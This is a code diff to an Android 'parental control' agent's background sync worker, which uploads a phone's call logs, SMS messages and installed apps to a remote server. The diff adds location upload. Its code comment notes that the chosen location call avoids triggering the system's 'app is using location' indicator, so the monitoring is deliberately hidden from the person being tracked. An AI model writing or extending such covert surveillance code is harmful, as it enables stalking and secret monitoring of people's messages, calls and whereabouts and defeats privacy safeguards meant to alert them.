@@ -4,19 +4,25 @@ import android.content.Context
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.Canvas
+import android.location.Location
 import android.provider.CallLog
 import android.util.Base64
 import java.io.ByteArrayOutputStream
 import android.provider.Telephony
 import android.util.Log
+import androidx.core.content.ContextCompat
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
+import com.google.android.gms.location.LocationServices
 import com.parentalcontrol.agent.AppLog
 import com.parentalcontrol.agent.TokenStore
 import com.parentalcontrol.agent.network.ApiClient
 import com.parentalcontrol.agent.network.CallLogEntry
 import com.parentalcontrol.agent.network.InstalledAppEntry
+import com.parentalcontrol.agent.network.LocationPayload
 import com.parentalcontrol.agent.network.SmsEntry
+import kotlinx.coroutines.suspendCancellableCoroutine
+import kotlin.coroutines.resume
 
 private const val TAG = "SyncWorker"
 
@@ -33,15 +39,63 @@ class SyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, 
         Log.d(TAG, "Starting sync with token: ...${TokenStore.cachedToken.takeLast(6)}")
 
         return try {
-            syncCallLogs()
-            syncSms()
-            syncInstalledApps()
+            trySync("location")  { syncLocation() }
+            trySync("calls")     { syncCallLogs() }
+            trySync("sms")       { syncSms() }
+            trySync("apps")      { syncInstalledApps() }
             AppLog.add(applicationContext, "✓ Sync completed")
             Result.success()
         } catch (e: Exception) {
-            Log.e(TAG, "Sync failed: ${e.message}", e)
-            AppLog.add(applicationContext, "✗ Sync failed: ${e.message}")
+            Log.e(TAG, "Sync fatal: ${e.message}", e)
+            AppLog.add(applicationContext, "✗ Sync fatal: ${e.message}")
             Result.retry()
+        }
+    }
+
+    /** Runs a sync step, logging but not rethrowing non-fatal errors. */
+    private suspend fun trySync(name: String, block: suspend () -> Unit) {
+        try {
+            block()
+        } catch (e: Exception) {
+            Log.e(TAG, "[$name] failed: ${e.javaClass.simpleName}: ${e.message}", e)
+            AppLog.add(applicationContext, "✗ [$name] ${e.javaClass.simpleName}: ${e.message?.take(80)}")
+        }
+    }
+
+    private suspend fun syncLocation() {
+        // Skip silently if location permission is not granted
+        val fineLocation  = android.Manifest.permission.ACCESS_FINE_LOCATION
+        val coarseLocation = android.Manifest.permission.ACCESS_COARSE_LOCATION
+        val hasPermission = ContextCompat.checkSelfPermission(applicationContext, fineLocation) == PackageManager.PERMISSION_GRANTED ||
+                            ContextCompat.checkSelfPermission(applicationContext, coarseLocation) == PackageManager.PERMISSION_GRANTED
+        if (!hasPermission) {
+            Log.d(TAG, "Location permission not granted, skipping")
+            return
+        }
+
+        val client = LocationServices.getFusedLocationProviderClient(applicationContext)
+        val location = try {
+            // getLastLocation reads the system-cached position; does NOT activate GPS
+            // and does NOT trigger the "app is using location" indicator.
+            suspendCancellableCoroutine<Location?> { cont ->
+                client.lastLocation
+                    .addOnSuccessListener { loc -> cont.resume(loc) }
+                    .addOnFailureListener { cont.resume(null) }
+            }
+        } catch (_: Exception) { null }
+
+        if (location != null) {
+            ApiClient.service.sendLocation(
+                LocationPayload(
+                    latitude  = location.latitude,
+                    longitude = location.longitude,
+                    accuracy  = location.accuracy,
+                    timestamp = System.currentTimeMillis()
+                )
+            )
+            AppLog.add(applicationContext, "📍 Location synced (${"%.4f".format(location.latitude)}, ${"%.4f".format(location.longitude)})")
+        } else {
+            Log.d(TAG, "getLastLocation returned null, skipping")
         }
     }
 
